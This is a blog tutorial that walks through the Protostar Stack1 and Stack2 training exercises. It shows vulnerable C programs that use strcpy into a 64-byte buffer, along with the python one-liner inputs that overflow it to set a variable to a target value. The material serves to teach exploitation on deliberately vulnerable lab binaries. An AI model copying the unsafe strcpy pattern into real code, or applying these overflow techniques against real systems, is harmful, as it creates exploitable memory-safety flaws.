<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Buffer Overflow Examples, Overwriting a variable value on the stack - Protostar Stack1 , Stack2 - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Buffer-Overflow-Examples-Overwriting-a-variable-value-on-the-stack-Protostar-Stack1-Stack2"><a href="#Buffer-Overflow-Examples-Overwriting-a-variable-value-on-the-stack-Protostar-Stack1-Stack2" class="headerlink" title="Buffer Overflow Examples, Overwriting a variable value on the stack - Protostar Stack1 , Stack2"></a>Buffer Overflow Examples, Overwriting a variable value on the stack - Protostar Stack1 , Stack2</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>So last week I talked about buffer overflows and solved Protostar Stack0. Today I’m gonna solve Stack1 and Stack2, they are not different from Stack0 in their objective which is changing a variable’s value , but they are different in the way of changing that variable for sure. With that being said let’s jump right in !<br><img src="/images/binary-exploitation/BOF2/0.png" alt=""><br>If you haven’t read my previous <a href="/BinaryExploitation-BOF/">post</a> yet I recommend reading it before this.</p>
<h2 id="Stack1"><a href="#Stack1" class="headerlink" title="Stack1"></a>Stack1</h2><p>For this challenge we got this code : </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line"> <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">"please specify an argument\n"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> modified = <span class="number">0</span>;</span><br><span class="line"> <span class="built_in">strcpy</span>(<span class="built_in">buffer</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(modified == <span class="number">0x61626364</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"you have correctly got the variable to the right value\n"</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Breakdown"><a href="#Breakdown" class="headerlink" title="Breakdown"></a>Breakdown</h3><p>So this code :<br>creates a variable called “modified” and assigns a buffer of 64 chars to it.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> modified; </span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br></pre></td></tr></table></figure>

<p>Checks if we supplied an argument or not.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line"> errx(<span class="number">1</span>, <span class="string">"please specify an argument\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Sets the value of the “modified” variable into 0 , then it copies whatever we give it <code>argv[1]</code> into the buffer of “modified”.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modified = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">buffer</span>, argv[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>Then it checks if the variable’s value is <code>0x61626364</code> or not</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(modified == <span class="number">0x61626364</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"you have correctly got the variable to the right value\n"</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>


<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is <code>0x61626364</code> in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it.<br>Let’s execute stack1<br><img src="/images/binary-exploitation/BOF2/1.png" alt=""><br>We get please specify an argument so let’s enter anything.<br><img src="/images/binary-exploitation/BOF2/2.png" alt=""></p>
<p><img src="/images/binary-exploitation/BOF2/3.png" alt=""><br>We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stack1 &#96;python -c &quot;print (&#39;A&#39; * 64 + &#39;b&#39;)&quot;&#96;</span><br></pre></td></tr></table></figure>
<p><img src="/images/binary-exploitation/BOF2/4.png" alt=""><br>And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stack1 &#96;python -c &quot;print (&#39;A&#39; * 64 + &#39;dcba&#39;)&quot;&#96;</span><br></pre></td></tr></table></figure>
<p><img src="/images/binary-exploitation/BOF2/5.png" alt=""><br>And we did it !<br>But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stack1 &#96;python -c &quot;print(&#39;A&#39; * 64 + &#39;\x64\x63\x62\x61&#39;)&quot;&#96;</span><br></pre></td></tr></table></figure>
<p><img src="/images/binary-exploitation/BOF2/6.png" alt=""></p>
<h2 id="Stack2"><a href="#Stack2" class="headerlink" title="Stack2"></a>Stack2</h2><p>For this challenge we got this code :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line"> <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line"> <span class="keyword">char</span> *variable;</span><br><span class="line"></span><br><span class="line"> variable = getenv(<span class="string">"GREENIE"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(variable == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">"please set the GREENIE environment variable\n"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> modified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">strcpy</span>(<span class="built_in">buffer</span>, variable);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(modified == <span class="number">0x0d0a0d0a</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"you have correctly modified the variable\n"</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="Breakdown-1"><a href="#Breakdown-1" class="headerlink" title="Breakdown"></a>Breakdown</h3><p>This code :<br>As always creates a variable called “modified” and assigns a buffer of 64 chars to it </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br></pre></td></tr></table></figure>

<p>The new thing here is a variable called “variable” which gets its value from an environment variable called “GREENIE”. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable = getenv(<span class="string">"GREENIE"</span>);</span><br></pre></td></tr></table></figure>

<p>The program checks if the variable “variable” has a value or not </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(variable == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">"please set the GREENIE environment variable\n"</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>Sets the value of modified to 0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modified = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>Then it copies the value of “variable” into the buffer of “modified”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">buffer</span>, variable);</span><br></pre></td></tr></table></figure>

<p>After that it checks if the value of “modified” is <code>0x0d0a0d0a</code> or not</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(modified == <span class="number">0x0d0a0d0a</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"you have correctly modified the variable\n"</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>So this time we can’t specify the value directly instead of that we have to do it through an environment variable. And this is actually a good example that shows the importance of being creative with your exploits , you won’t face the same situation every time so you have to come up with an exploit that fits with the application’s functionality.<br>In this situation we can apply our usual exploit and store that value into the environment variable “GREENIE”.<br>But wait a minute , what is an environment variable ?</p>
<h3 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h3><p>Simply , Environment variables are variables that are being used to store values of some stuff that the system uses also the services can access those variables. For a better demonstration let’s see an example.<br>If we take the environment variable BASH and look at it :<br><img src="/images/binary-exploitation/BOF2/7.png" alt=""><br>We see that its value is : /bin/bash<br>So for example if I want to run bash I type bash in the terminal instead of <code>./bin/bash</code> because the system calls the variable BASH and finds its path.<br>But the system won’t store a variable for every binary that exists on the system so there’s an environment variable called PATH which has all the possible dirs that could contain bins, So when you type for example : python, it searches in those dirs then executes python<br><img src="/images/binary-exploitation/BOF2/8.png" alt=""><br>So you get the idea. Understanding environment variables is not necessary for this challenge but I wanted to talk about it just to make everything clear for anyone.<br><a href="https://en.wikipedia.org/wiki/Environment_variable" target="_blank" rel="noopener">More about environment variables</a></p>
<p>Now let’s execute stack2<br><img src="/images/binary-exploitation/BOF2/9.png" alt=""><br>We get Please set the GREENIE environment variable.<br>There’s no environment variable called GREENIE so we need to create it. We will make it’s value equal to 64 chars then <code>0x0d0a0d0a</code><br>This time we won’t be able to use the value in ASCII like we did with stack1 because <code>0x0d</code> is a return <code>\r</code> and <code>0x0a</code> is a new line <code>\n</code> and we can’t type those so we will use the hex values and python will translate them.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GREENIE &#x3D; &#96;python -c &quot;print (&#39;A&#39; * 64 + &#39;\x0a\x0d\x0a\x0d&#39;)&quot;&#96;</span><br></pre></td></tr></table></figure>
<p><img src="/images/binary-exploitation/BOF2/10.png" alt=""><br>When we look at it we only see the 64 A’s and that’s because we can’t see the new line or the return<br>Now we need to export it to the environment variables list then we are good to go. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export GREENIE</span><br><span class="line">.&#x2F;stack2</span><br></pre></td></tr></table></figure>
<p><img src="/images/binary-exploitation/BOF2/11.png" alt=""><br>And we did it ! </p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Binary Exploitation article : <a href="/binary-exploitation/bof1/">Binary Exploitation - Buffer Overflow Explained in Detail</a><br>Next Binary Exploitation article : <a href="/binary-exploitation/bof3/">Buffer Overflow Examples, Overwriting a function pointer - protostar stack3</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2018-12-30</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/binary-exploitation/">binary-exploitation</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/buffer-overflow/" rel="tag">#buffer-overflow</a> <a class="tag-link" href="/tags/c/" rel="tag">#c</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
